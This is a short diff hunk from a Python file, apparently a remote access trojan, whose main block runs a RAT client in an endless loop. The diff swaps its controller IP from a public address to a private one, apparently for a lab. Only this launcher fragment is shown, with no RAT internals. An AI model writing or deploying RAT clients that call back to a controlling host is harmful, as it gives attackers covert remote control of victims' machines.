@@ -203,4 +203,4 @@ class Client:
 if __name__ == "__main__":
     # Run RAT with specified IP and port continuously
     while 1:
-        Client("131.155.204.207").run()
+        Client("192.168.56.102").run()
